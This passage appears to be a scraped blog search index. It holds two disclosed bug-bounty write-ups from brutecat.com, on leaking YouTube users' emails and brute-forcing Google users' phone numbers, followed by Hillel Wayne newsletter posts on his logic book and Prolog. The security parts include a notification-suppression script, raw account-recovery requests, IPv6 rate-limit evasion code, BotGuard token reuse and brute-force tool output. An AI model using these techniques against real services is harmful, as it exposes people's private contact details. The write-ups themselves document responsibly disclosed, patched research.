\"X-Goog-Api-Key\": \"AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro\",\n    \"Origin\": \"https://recorder.google.com\"\n}\n\ndef get_recording_uuid(share_id: str):\n    payload = f\"[\\\"{share_id}\\\"]\"\n    response = requests.post(BASE_URL + \"GetRecordingInfo\" + \"?alt=json\", headers=headers, data=payload)\n    if response.status_code != 200:\n        print(\"unknown error when getting recording uuid: \", response.json())\n        exit(1)\n    try:\n        response = response.json()\n    except:\n        print('can\\'t parse response when getting recording uuid: ', response.text)\n        exit(1)\n\n    return response[\"recording\"][\"uuid\"]\n\ndef update_recording_title(share_id: str):\n    x = 'X'*2500000 # 2.5 million char long title name!\n    payload = f'[\"{share_id}\",\"{x}\"]'\n    response = requests.post(BASE_URL + \"UpdateRecordingTitle\" + \"?alt=json\", headers=headers, data=payload)\n    if response.status_code != 200:\n        print(\"unknown error when updating recording title: \", response.json())\n        exit(1)\n\ndef main():\n    share_id = input(\"Enter share ID: \")\n    headers[\"Cookie\"] = input(\"Cookie header:\" )\n    headers[\"Authorization\"] = input(\"Authorization header: \")\n    uuid = get_recording_uuid(share_id)\n    print(\"UUID:\", uuid)\n    update_recording_title(uuid)\n    print(\"Updated recording title successfully.\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>... and the recording title was now 2.5 million letters long! There wasn't any server-side limit to the length of a recording name.  </p> <p> </p> <p>Trying to share the recording with a different test user... bingo! No notification email.  </p> <p></p>"},{"location":"brutecat.com/Leaking%20the%20email%20of%20any%20YouTube%20user%20for%20%2410%2C000_20260205/#putting-it-all-together","title":"Putting it all together","text":"<p>We basically have the full attack chain, we just have to put it together.</p> <ul> <li>Leak the obfuscated Gaia ID of the YouTube channel from the Innertube endpoint <code>/get_item_context_menu</code></li> <li>Share the Pixel recording with an extremely long name with the target to convert the Gaia ID to an email</li> <li>Remove the target from the Pixel recording (cleanup)</li> </ul> <p>Here's a POC of the exploit in action:</p>"},{"location":"brutecat.com/Leaking%20the%20email%20of%20any%20YouTube%20user%20for%20%2410%2C000_20260205/#timeline","title":"Timeline","text":"<ul> <li>2024-09-15 - Report sent to vendor</li> <li>2024-09-16 - Vendor triaged report</li> <li>2024-09-16 - \ud83c\udf89 Nice catch!</li> <li>2024-10-03 - Panel marks it as duplicate of existing-tracked bug, does botched patch of initial YouTube obfuscated Gaia ID disclosure</li> <li>2024-10-03 - Clarified to vendor that they haven't recognized Pixel recorder as vulnerability itself (since obfuscated Gaia IDs are leaked for Google Maps/Play reviewers) and provided vendor a work-around method to once again leak YouTube channel obfuscated Gaia IDs</li> <li>2024-11-05 - Panel awards $3,133. Rationale: Exploitation likelihood is medium. Issue qualified as an abuse-related methodology with high impact.</li> <li>2024-12-03 - Product team sent report back to panel for additional reward consideration, coordinates disclosure for 2025-02-03</li> <li>2024-12-12 - Panel awards an additional $7,500. Rationale: Exploitation likelihood is high. Issue qualified as an abuse-related methodology with high impact. Applied 1 downgrade from the base amount due to complexity of attack chain required.</li> <li>2025-01-29 - Vendor requests extension for disclosure to 2025-02-02</li> <li>2025-02-09 - Confirm to vendor that both parts of the exploit have been fixed (T+147 days since disclosure)</li> <li>2025-02-12 - Report disclosed</li> </ul>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/","title":"Leaking the phone number of any Google user","text":"<p>\u6765\u6e90: https://brutecat.com \u94fe\u63a5: https://brutecat.com/articles/leaking-google-phones \u65e5\u671f: Mon, 09 Jun 2025 00:00:00 GMT</p> <p>A few months ago, I disabled javascript on my browser while testing if there were any Google services left that still worked without JS in the modern web. Interestingly enough, the username recovery form still worked!</p> <p>This surprised me, as I used to think these account recovery forms required javascript since 2018 as they relied on botguard solutions generated from heavily obfuscated proof-of-work javascript code for anti-abuse.</p>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#a-deeper-look-into-the-endpoints","title":"A deeper look into the endpoints","text":"<p>The username recovery form seemed to allow you to check if a recovery email or phone number was associated with a specific display name. This required 2 HTTP requests:</p> <p>Request</p> <pre><code>POST /signin/usernamerecovery HTTP/2\nHost: accounts.google.com\nCookie: __Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o\nContent-Length: 81\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n\nEmail=+18085921029&amp;hl=en&amp;gxf=AFoagUVs61GL09C_ItVbtSsQB4utNqVgKg%3A1747557783359\n</code></pre> <p>The cookie and gxf values are from the initial page HTML</p> <p>Response</p> <pre><code>HTTP/2 302 Found\nContent-Type: text/html; charset=UTF-8\nLocation: https://accounts.google.com/signin/usernamerecovery/name?ess=..&lt;SNIP&gt;..&amp;hl=en\n</code></pre> <p>This gave us a <code>ess</code> value tied to that phone number we can use for the next HTTP request.</p> <p>Request</p> <pre><code>POST /signin/usernamerecovery/lookup HTTP/2\nHost: accounts.google.com\nCookie: __Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o\nOrigin: https://accounts.google.com\nContent-Type: application/x-www-form-urlencoded\nPriority: u=0, i\n\nchallengeId=0&amp;challengeType=28&amp;ess=&lt;snip&gt;&amp;bgresponse=js_disabled&amp;GivenName=john&amp;FamilyName=smith\n</code></pre> <p>This request allows us to check if a Google account exists with that phone number as well as the display name <code>\"John Smith\"</code>. </p> <p>Response (no account found)</p> <pre><code>HTTP/2 302 Found\nContent-Type: text/html; charset=UTF-8\nLocation: https://accounts.google.com/signin/usernamerecovery/noaccountsfound?ess=...\n</code></pre> <p>Response (account found)</p> <pre><code>HTTP/2 302 Found\nContent-Type: text/html; charset=UTF-8\nLocation: https://accounts.google.com/signin/usernamerecovery/challenge?ess=...\n</code></pre>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#can-we-even-brute-this","title":"Can we even brute this?","text":"<p>My first attempts were futile. It seemed to ratelimit your IP address after a few requests and present a captcha.</p> <p>Perhaps we could use proxies to get around this? If we take Netherlands as an example, the forgot password flow provides us with the phone hint <code>\u2022\u2022 \u2022\u2022\u2022\u2022\u2022\u202203</code></p> <p>For Netherlands mobile numbers, they always start with <code>06</code>, meaning there's 6 digits we'd have to brute. 10**6 = 1,000,000 numbers. That might be doable with proxies, but there had to be a better way.</p>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#what-about-ipv6","title":"What about IPv6?","text":"<p>Most service providers like Vultr provide /64 ip ranges, which provide us with 18,446,744,073,709,551,616 addresses. In theory, we could use IPv6 and rotate the IP address we use for every request, bypassing this ratelimit.</p> <p>The HTTP server also seemed to support IPv6:</p> <pre><code>~ $ curl -6 https://accounts.google.com\n&lt;HTML&gt;\n&lt;HEAD&gt;\n&lt;TITLE&gt;Moved Temporarily&lt;/TITLE&gt;\n&lt;/HEAD&gt;\n&lt;BODY BGCOLOR=\"#FFFFFF\" TEXT=\"#000000\"&gt;\n&lt;!-- GSE Default Error --&gt;\n&lt;H1&gt;Moved Temporarily&lt;/H1&gt;\nThe document has moved &lt;A HREF=\"https://accounts.google.com/ServiceLogin?passive=1209600&amp;amp;continue=https%3A%2F%2Faccounts.google.com%2F&amp;amp;followup=https%3A%2F%2Faccounts.google.com%2F\"&gt;here&lt;/A&gt;.\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n</code></pre> <p>To test this out, I routed my IPv6 range through my network interface and I started work on gpb, using reqwest's local_address method on its <code>ClientBuilder</code> to set my IP address to a random IP on my subnet:</p> <pre><code>pub fn get_rand_ipv6(subnet: &amp;str) -&gt; IpAddr {\n    let (ipv6, prefix_len) = match subnet.parse::&lt;Ipv6Cidr&gt;() {\n        Ok(cidr) =&gt; {\n            let ipv6 = cidr.first_address();\n            let length = cidr.network_length();\n            (ipv6, length)\n        }\n        Err(_) =&gt; {\n            panic!(\"invalid IPv6 subnet\");\n        }\n    };\n\n    let ipv6_u128: u128 = u128::from(ipv6);\n    let rand: u128 = random();\n\n    let net_part = (ipv6_u128 &gt;&gt; (128 - prefix_len)) &lt;&lt; (128 - prefix_len);\n    let host_part = (rand &lt;&lt; prefix_len) &gt;&gt; prefix_len;\n    let result = net_part | host_part;\n\n    IpAddr::V6(Ipv6Addr::from(result))\n}\n\npub fn create_client(subnet: &amp;str, user_agent: &amp;str) -&gt; Client {\n    let ip = get_rand_ipv6(subnet);\n\n    Client::builder()\n        .redirect(redirect::Policy::none())\n        .danger_accept_invalid_certs(true)\n        .user_agent(user_agent)\n        .local_address(Some(ip))\n        .build().unwrap()\n}\n</code></pre> <p>Eventually, I had a PoC running, but I was still getting the captcha? It seemed that for whatever reason, datacenter IP addresses using the JS disabled form were always presented with a captcha, damn!</p>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#using-the-botguard-token-from-the-js-form","title":"Using the BotGuard token from the JS form","text":"<p>I was looking through the 2 requests again, seeing if there was anything I could find to get around this, and <code>bgresponse=js_disabled</code> caught my eye. I remembered that on the JS-enabled account recovery form, the botguard token was passed via the bgRequest parameter.</p> <p></p> <p>What if I replace <code>js_disabled</code> with the botguard token from the JS-enabled form request? I tested it out, and it worked??. The botguard token seemed to have no request limit on the No-JS form, but who are all these random people?</p> <pre><code>$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 -f Henry -l Chancellor -w 3000\nStarting with 3000 threads...\nHIT: +31612345603\nHIT: +31623456703\nHIT: +31634567803\nHIT: +31645678903\nHIT: +31656789003\nHIT: +31658854003\nHIT: +31667890103\nHIT: +31678901203\nHIT: +31689012303\nHIT: +31690123403\nHIT: +31701234503\nHIT: +31712345603\nHIT: +31723456703\n</code></pre> <p>It took me a bit to realize this, but those were all people who had the Google account name \"Henry\" with no last name set, as well as a phone with the last 2 digits 03. For those numbers, it would return <code>usernamerecovery/challenge</code> for the first name Henry and any last name.</p> <p>I added some extra code to validate a possible hit with the first name, and a random last name like <code>0fasfk1AFko1wf</code>. If it still claimed it was a hit, it would be filtered out, and there we go:</p> <pre><code>$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 --firstname Henry --lastname Chancellor --workers 3000\nStarting with 3000 threads...\nHIT: +31658854003\nFinished.\n</code></pre> <p>In practise, it's unlikely to get more than one hit as it's uncommon for another Google user to have the same full display name, last 2 digits as well as country code. </p>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#a-few-things-to-sort-out","title":"A few things to sort out","text":"<p>We have a basic PoC working, but there's still some issues we have to address.</p> <ul> <li> <p>How do we know which country code a victim's phone is?</p> </li> <li> <p>How do we get the victim's Google account display name?</p> </li> </ul>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#how-do-we-know-which-country-code-a-victims-phone-is","title":"How do we know which country code a victim's phone is?","text":"<p>Interestingly enough, it's possible for us to figure out the country code based off of the phone mask that the forgot password flow provides us. Google actually just uses libphonenumbers's \"national format\" for each number.</p> <p>Here's some examples:</p> <pre><code>{\n    ...\n    \"\u2022 (\u2022\u2022\u2022) \u2022\u2022\u2022-\u2022\u2022-\u2022\u2022\": [\n        \"ru\"\n    ],\n    \"\u2022\u2022 \u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\": [\n        \"nl\"\n    ],\n    \"\u2022\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022\u2022\u2022\": [\n        \"gb\"\n    ],\n    \"(\u2022\u2022\u2022) \u2022\u2022\u2022-\u2022\u2022\u2022\u2022\": [\n        \"us\"\n    ]\n}\n</code></pre> <p>I wrote a script that collected the masked national format for all countries as mask.json</p>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#how-do-we-get-the-victims-google-account-display-name","title":"How do we get the victim's Google account display name?","text":"<p>Initially in 2023, Google changed their policy to only show names if there was direct interaction from the target to you (emails, shared docs, etc.), so they slowly removed names from endpoints. By April 2024, they updated their Internal People API service to completely stop returning display names for unauthenticated accounts, removing display names almost everywhere. </p> <p>It was going to be tricky to find a display name leak after all that, but eventually after looking through random Google products, I found out that I could create a Looker Studio document, transfer ownership of it to the victim, and the victim's display name would leak on the home page, with 0 interaction required from the victim :</p>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#optimizing-it-further","title":"Optimizing it further","text":"<p>By using libphonenumbers's number validation, I was able to generate a format.json with mobile phone prefix, known area codes and digits count for every country.</p> <pre><code> ...\n  \"nl\": {\n        \"code\": \"31\",\n        \"area_codes\": [\"61\", \"62\", \"63\", \"64\", \"65\", \"68\"],\n        \"digits\": [7]\n    },\n ...\n</code></pre> <p>I also implemented real-time libphonenumber validation to reduce queries to Google's API for invalid numbers. For the botguard token, I wrote a Go script using chromedp that lets you generate BotGuard tokens with just a simple API call:</p> <pre><code>$ curl http://localhost:7912/api/generate_bgtoken\n{\n  \"bgToken\": \"&lt;generated_botguard_token&gt;\"\n}\n</code></pre>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#putting-it-all-together","title":"Putting it all together","text":"<p>We basically have the full attack chain, we just have to put it together.</p> <ul> <li>Leak the Google account display name via Looker Studio</li> <li>Go through forgot password flow for that email and get the masked phone</li> <li>Run the <code>gpb</code> program with the display name and masked phone to bruteforce the phone number</li> </ul>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#time-required-to-brute-the-number","title":"Time required to brute the number","text":"<p>Using a $0.30/hour server with consumer-grade specs (16 vcpu), I'm able to achieve ~40k checks per second.</p> <p>With just the last 2 digits from the Forgot Password flow phone hint:</p> Country code Time required United States (+1) 20 mins United Kingdom (+44) 4 mins Netherlands (+31) 15 secs Singapore (+65) 5 secs <p>This time can also be significantly reduced through phone number hints from password reset flows in other services such as PayPal, which provide several more digits (ex. <code>+14\u2022\u2022\u2022\u2022\u20221779</code>)</p>"},{"location":"brutecat.com/Leaking%20the%20phone%20number%20of%20any%20Google%20user_20260205/#timeline","title":"Timeline","text":"<ul> <li>2025-04-14 - Report sent to vendor</li> <li>2025-04-15 - Vendor triaged report</li> <li>2025-04-25 - \ud83c\udf89 Nice catch!</li> <li>2025-05-15 - Panel awards $1,337 + swag. Rationale: Exploitation likelihood is low. (lol) Issue qualified as an abuse-related methodology with high impact. </li> <li>2025-05-15 - Appeal reward reason: As per the Abuse VRP table, probability/exploitability is decided based on pre-requisites required for this attack and whether the victim can discover exploitation. For this attack, there are no pre-requisites and it cannot be discovered by the victim.</li> <li>2025-05-22 - Panel awards an additional $3,663. Rationale: Thanks for your feedback on our initial reward. We took your points into consideration and discussed at some length. We're happy to share that we've upgraded likelihood to medium and adjusted the reward to a total of $5,000 (plus the swag code we've already sent). Thanks for the report, and we look forward to your next one.</li> <li>2025-05-22 - Vendor confirms they have rolled out inflight mitigations while endpoint deprecation rolls out worldwide.</li> <li>2025-05-22 - Coordinates disclosure with vendor for 2025-06-09</li> <li>2025-06-06 - Vendor confirms that the No-JS username recovery form has been fully deprecated</li> <li>2025-06-09 - Report disclosed</li> </ul>"},{"location":"buttondown.com/hillelwayne/","title":"buttondown.com/hillelwayne","text":"<p>Hi, I'm Hillel. This is the newsletter version of my website. I post all website updates here. I also post weekly content just for the newsletter, on topics like * Formal Methods * Software History and Culture * Fringetech and exotic tooling * The philosophy and theory of software engineering You can see the archive of all public essays here.</p> <p>\u7f51\u7ad9: https://buttondown.com/hillelwayne RSS: https://buttondown.com/hillelwayne/rss</p>"},{"location":"buttondown.com/hillelwayne/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Logic for Programmers New Release and Next Steps_20260205</li> <li>Refinement without Specification_20260205</li> <li>My Gripes with Prolog_20260205</li> <li>The Liskov Substitution Principle does more than you think_20260205</li> <li>Some Fun Software Facts_20260205</li> </ul>"},{"location":"buttondown.com/hillelwayne/Logic%20for%20Programmers%20New%20Release%20and%20Next%20Steps_20260204/","title":"Logic for Programmers New Release and Next Steps","text":"<p>\u6765\u6e90: buttondown.com/hillelwayne \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 14:00:00 +0000 \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/logic-for-programmers-new-release-and-next-steps/</p> <p>It's taken four months, but the next release of Logic for Programmers is now available ! v0.13 is over 50,000 words, making it both 20% larger than v0.12 and officially the longest thing I have ever written. 1 Full release notes are here , but I'll talk a bit about the biggest changes. For one, every chapter has been rewritten. Every single one. They span from relatively minor changes to complete chapter rewrites. After some rough git diffing, I think I deleted about 11,000 words? 2 The biggest change is probably to the Alloy chapter. After many sleepless nights, I realized the right approach wasn't to teach Alloy as a data modeling tool but to teach it as a domain modeling tool. Which technically means the book no longer covers data modeling. There's also a lot more connections between the chapters. The introductory math chapter, for example, foreshadows how each bit of math will be used in the future techniques. I also put more emphasis on the general \"themes\" like the expressiveness-guarantees tradeoff (working title). One theme I'm really excited about is compatibility (extremely working title). It turns out that the Liskov substitution principle /subtyping in general, database migrations , backwards-compatible API changes, and specification refinement all follow basically the same general principles. I'm calling this \"compatibility\" for now but prolly need a better name. Finally, there's just a lot more new topics in the various chapters. Testing properly covers structural and metamorphic properties. Proofs covers proof by induction and proving recursive functions (in an exercise). Logic Programming now finally has a section on answer set programming. You get the picture. Next Steps There's a lot I still want to add to the book: proper data modeling, data structures, type theory, model-based testing, etc. But I've added new material for two year, and if I keep going it will never get done. So with this release, all the content is in! Just like all the content was in two Novembers ago and two Januaries ago and last July . To make it absolutely 100% for sure that I won't be tempted to add anything else, I passed the whole manuscript over to a copy editor. So if I write more, it won't get edits. That's a pretty good incentive to stop. I also need to find a technical reviewer and proofreader. Once all three phases are done then it's \"just\" a matter of fixing the layout and finding a good printer. I don't know what the timeline looks like but I really want to have something I can hold in my hands before the summer. (I also need to get notable-people testimonials. Hampered a little in this because I'm trying real hard not to quid-pro-quo, so I'd like to avoid anybody who helped me or is mentioned in the book. And given I tapped most of my network to help me... I've got some ideas though!) There's still a lot of work ahead. Even so, for the first time in two years I don't have research to do or sections to write and it feels so crazy. Maybe I'll update my blog again! Maybe I'll run a workshop! Maybe I'll go outside if Chicago ever gets above 6\u00b0F! Conference Season After a pretty slow 2025, the 2026 conference season is looking to be pretty busy! Here's where I'm speaking so far: QCon London , March 16-19 Craft Conference , Budapest, June 4-5 Software Should Work , Missouri, July 16-17 Houston Functional Programmers , Virtual, December 3 For the first three I'm giving variations of my talk \"How to find bugs in systems that don't exist\", which I gave last year at Systems Distributed . Last one will ideally be a talk based on LfP. The second longest was my 2003 NaNoWriMo. The third longest was Practical TLA+ . \u21a9 This means I must have written 20,000 words total. For comparison, the v0.1 release was 19,000 words. \u21a9</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:42</p>"},{"location":"buttondown.com/hillelwayne/Logic%20for%20Programmers%20New%20Release%20and%20Next%20Steps_20260205/","title":"Logic for Programmers New Release and Next Steps","text":"<p>\u6765\u6e90: https://buttondown.com/hillelwayne \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/logic-for-programmers-new-release-and-next-steps/ \u65e5\u671f: Wed, 04 Feb 2026 14:00:00 +0000</p> <p></p> <p>It's taken four months, but the next release of Logic for Programmers is now available! v0.13 is over 50,000 words, making it both 20% larger than v0.12 and officially the longest thing I have ever written.1 Full release notes are here, but I'll talk a bit about the biggest changes. </p> <p>For one, every chapter has been rewritten. Every single one. They span from relatively minor changes to complete chapter rewrites. After some rough git diffing, I think I deleted about 11,000 words?2 The biggest change is probably to the Alloy chapter. After many sleepless nights, I realized the right approach wasn't to teach Alloy as a data modeling tool but to teach it as a domain modeling tool. Which technically means the book no longer covers data modeling.</p> <p>There's also a lot more connections between the chapters. The introductory math chapter, for example, foreshadows how each bit of math will be used in the future techniques. I also put more emphasis on the general \"themes\" like the expressiveness-guarantees tradeoff (working title). One theme I'm really excited about is compatibility (extremely working title). It turns out that the Liskov substitution principle/subtyping in general, database migrations, backwards-compatible API changes, and specification refinement all follow basically the same general principles. I'm calling this \"compatibility\" for now but prolly need a better name.</p> <p>Finally, there's just a lot more new topics in the various chapters. <code>Testing</code> properly covers structural and metamorphic properties. <code>Proofs</code> covers proof by induction and proving recursive functions (in an exercise). <code>Logic Programming</code> now finally has a section on answer set programming. You get the picture.</p>"},{"location":"buttondown.com/hillelwayne/Logic%20for%20Programmers%20New%20Release%20and%20Next%20Steps_20260205/#next-steps","title":"Next Steps","text":"<p>There's a lot I still want to add to the book: proper data modeling, data structures, type theory, model-based testing, etc. But I've added new material for two year, and if I keep going it will never get done. So with this release, all the content is in!</p> <p>Just like all the content was in two Novembers ago and two Januaries ago and last July. To make it absolutely 100% for sure that I won't be tempted to add anything else, I passed the whole manuscript over to a copy editor. So if I write more, it won't get edits. That's a pretty good incentive to stop.</p> <p>I also need to find a technical reviewer and proofreader. Once all three phases are done then it's \"just\" a matter of fixing the layout and finding a good printer. I don't know what the timeline looks like but I really want to have something I can hold in my hands before the summer.</p> <p>(I also need to get notable-people testimonials. Hampered a little in this because I'm trying real hard not to quid-pro-quo, so I'd like to avoid anybody who helped me or is mentioned in the book. And given I tapped most of my network to help me... I've got some ideas though!)</p> <p>There's still a lot of work ahead. Even so, for the first time in two years I don't have research to do or sections to write and it feels so crazy. Maybe I'll update my blog again! Maybe I'll run a workshop! Maybe I'll go outside if Chicago ever gets above 6\u00b0F! </p>"},{"location":"buttondown.com/hillelwayne/Logic%20for%20Programmers%20New%20Release%20and%20Next%20Steps_20260205/#conference-season","title":"Conference Season","text":"<p>After a pretty slow 2025, the 2026 conference season is looking to be pretty busy! Here's where I'm speaking so far:</p> <ul> <li>QCon London, March 16-19</li> <li>Craft Conference, Budapest, June 4-5</li> <li>Software Should Work, Missouri, July 16-17</li> <li>Houston Functional Programmers, Virtual, December 3</li> </ul> <p>For the first three I'm giving variations of my talk \"How to find bugs in systems that don't exist\", which I gave last year at Systems Distributed. Last one will ideally be a talk based on LfP. </p> <ol> <li> <p>The second longest was my 2003 NaNoWriMo. The third longest was Practical TLA+. \u21a9</p> </li> <li> <p>This means I must have written 20,000 words total. For comparison, the v0.1 release was 19,000 words. \u21a9</p> </li> </ol>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260114/","title":"My Gripes with Prolog","text":"<p>\u6765\u6e90: buttondown.com/hillelwayne \u53d1\u5e03\u65f6\u95f4: Wed, 14 Jan 2026 16:48:51 +0000 \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/my-gripes-with-prolog/</p> <p>For the next release of Logic for Programmers , I'm finally adding the sections on Answer Set Programming and Constraint Logic Programming that I TODOd back in version 0.9. And this is making me re-experience some of my pain points with Prolog, which I will gripe about now.  If you want to know more about why Prolog is cool instead, go here or here or here or here . No standardized strings ISO \"strings\" are just atoms or lists of single-character atoms (or lists of integer character codes). The various implementations of Prolog add custom string operators but they are not cross compatible, so code written with strings in SWI-Prolog will not work in Scryer Prolog. No functions Code logic is expressed entirely in rules , predicates which return true or false for certain values. For example if you wanted to get the length of a Prolog list, you write this: ?- length ([ a , b , c ], Len ). Len = 3. Now this is pretty cool in that it allows bidirectionality, or running predicates \"in reverse\". To generate lists of length 3, you can write length(L, 3) . But it also means that if you want to get the length a list plus one , you can't do that in one expression, you have to write length(List, Out), X is Out+1 . For a while I thought no functions was necessary evil for bidirectionality, but then I discovered Picat has functions and works just fine. That by itself is a reason for me to prefer Picat for my LP needs. (Bidirectionality is a killer feature of Prolog, so it's a shame I so rarely run into situations that use it.) No standardized collection types besides lists Aside from atoms ( abc ) and numbers, there are two data types: Linked lists like [a,b,c,d] . Compound terms like dog(rex, poodle) , which seem like record types but are actually tuples. You can even convert compound terms to linked lists with =.. : ?- L =.. [ a , b , c ]. L = a ( b , c ). ?- a ( b , c ( c )) =.. L . L = [ a , b , c ( c )]. There's no proper key-value maps or even struct types. Again, this is something that individual distributions can fix (without cross compatibility), but these never feel integrated with the rest of the language. No boolean values true and false aren't values, they're control flow statements. true is a noop and false says that the current search path is a dead end, so backtrack and start again. You can't explicitly store true and false as values, you have to implicitly have them in facts ( passed(test) instead of test.passed? == true ). This hasn't made any tasks impossible, and I can usually find a workaround to whatever I want to do. But I do think it makes things more inconvenient! Sometimes I want to do something dumb like \"get all atoms that don't pass at least three of these rules\", and that'd be a lot easier if I could shove intermediate results into a sack of booleans. (This is called \" Negation as Failure \". I think this might be necessary to make Prolog a Turing complete general programming language. Picat fixes a lot of Prolog's gripes and still has negation as failure. ASP has regular negation but it's not Turing complete.) Cuts are confusing Prolog finds solutions through depth first search, and a \"cut\" ( ! ) symbol prevents backtracking past a certain point. This is necessary for optimization but can lead to invalid programs. You're not supposed to use cuts if you can avoid it, so I pretended cuts didn't exist. Which is why I was surprised to find that conditionals are implemented with cuts. Because cuts are spooky dark magic conditionals sometimes conditionals work as I expect them to and sometimes leave out valid solutions and I have no idea how to tell which it'll be. Usually I find it safer to just avoid conditionals entirely, which means my code gets a lot longer and messier. Non-cuts are confusing The original example in the last section was this: foo ( A , B ) :- + ( A = B ), A = 1 , B = 2. foo(1, 2) returns true, so you'd expect f(A, B) to return A=1, B=2 . But it returns false .  Whereas this works as expected. bar ( A , B ) :- A = 1 , B = 2 , + ( A = B ). I thought this was because + was implemented with cuts, and the Clocksin book suggests it's call(P), !, fail , so this was my prime example about how cuts are confusing. But then I tried this: ?- member ( A , [ 1 , 2 , 3 ]), + ( A = 2 ), A = 3. A = 3. % wtf? There's no way to get that behavior with cuts! I don't think + uses cuts at all! And now I have to figure out why foo(A, B) doesn't returns results. Is it floundering ? Is it because + P only succeeds if P fails, and A = B always succeeds? A closed-world assumption? Something else? 1 Straying outside of default queries is confusing Say I have a program like this: tree ( n , n1 ). tree ( n , n2 ). tree ( n1 , n11 ). tree ( n2 , n21 ). tree ( n2 , n22 ). tree ( n11 , n111 ). tree ( n11 , n112 ). branch ( N ) :- % two children tree ( N , C1 ), tree ( N , C2 ), C1 @&lt; C2 . % ordering And I want to know all of the nodes that are parents of branches. The normal way to do this is with a query: ?- tree ( A , N ), branch ( N ). A = n , N = n2 ; % show more... A = n1 , N = n11 . This is interactively making me query for every result. That's usually not what I want, I know the result of my query is finite and I want all of the results at once, so I can count or farble or whatever them. It took a while to figure out that the proper solution is bagof(Template, Goal, Bag) , which will \"Unify Bag with the alternatives of Template\": ?- bagof ( A , ( tree ( A , N ), branch ( N )), As ). As = [ n1 ], N = n11 ; As = [ n ], N = n2 . Wait crap that's still giving one result at a time, because N is a free variable in bagof so it backtracks over that. It surprises me but I guess it's good to have as an option. So how do I get all of the results at once? ?- bagof ( A , N ^ ( tree ( A , N ), branch ( N )), As ). As = [ n , n1 ] The only difference is the N^Goal , which tells bagof to ignore and group the results of N . As far as I can tell, this is the only place the ISO standard uses ^ to mean anything besides exponentiation. Supposedly it's the existential quantifier ? In general whenever I try to stray outside simpler use-cases, especially if I try to do things non-interactively, I run into trouble. I have mixed feelings about symbol terms It took me a long time to realize the reason bagof \"works\" is because infix symbols are mapped to prefix compound terms, so that a^b is ^(a, b) , and then different predicates can decide to do different things with ^(a, b) . This is also why you can't just write A = B+1 : that unifies A with the compound term +(B, 1) . A+1 = B+2 is false , as 1 \\= 2 . You have to write A+1 is B+2 , as is is the operator that converts +(B, 1) to a mathematical term. (And that fails because is isn't fully bidirectional. The lhs must be a single variable. You have to import clpfd and write A + 1 #= B + 2 .) I don't like this, but I'm a hypocrite for saying that because I appreciate the idea and don't mind custom symbols in other languages. I guess what annoys me is there's no official definition of what ^(a, b) is, it's purely a convention. ISO Prolog uses -(a, b) (aka a-b ) as a convention to mean \"pairs\", and the only way to realize that is to see that an awful lot of standard modules use that convention. But you can use -(a, b) to mean something else in your own code and nothing will warn you of the inconsistency. Anyway I griped about pairs so I can gripe about sort . go home sort, ur drunk This one's just a blunder: ?- sort ([ 3 , 1 , 2 , 1 , 3 ], Out ). Out = [ 1 , 2 , 3 ]. % wat According to an expert online this is because sort is supposed to return a sorted set , not a sorted list. If you want to preserve duplicates you're supposed to lift all of the values into -($key, $value) compound terms, then use keysort , then extract the values. And, since there's no functions, this process takes at least three lines. This is also how you're supposed to sort by a custom predicate, like \"the second value of a compound term\". (Most (but not all) distributions have a duplicate merge like msort . SWI-Prolog also has a sort by key but it removes duplicates.) Please just let me end rules with a trailing comma instead of a period, I'm begging you I don't care if it makes fact parsing ambiguous, I just don't want \"reorder two lines\" to be a syntax error anymore I expect by this time tomorrow I'll have been Cunningham'd and there will be a 2000 word essay about how all of my gripes are either easily fixable by doing XYZ or how they are the best possible choice that Prolog could have made. I mean, even in writing this I found out some fixes to problems I had. Like I was going to gripe about how I can't run SWI-Prolog queries from the command line but, in doing do diligence finally finally figured it out: swipl -t halt -g \"bagof(X, Goal, Xs), print(Xs)\" ./file.pl It's pretty clunky but still better than the old process of having to enter an interactive session every time I wanted to validate a script change. (Also, answer set programming is pretty darn cool. Excited to write about it in the book!) A couple of people mentioned using dif/2 instead of + A = B . Dif is great but usually I hit the negation footgun with things like + foo(A, B), bar(B, C), baz(A, C) , where dif/2 isn't applicable. \u21a9</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:45</p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/","title":"My Gripes with Prolog","text":"<p>\u6765\u6e90: https://buttondown.com/hillelwayne \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/my-gripes-with-prolog/ \u65e5\u671f: Wed, 14 Jan 2026 16:48:51 +0000</p> <p>For 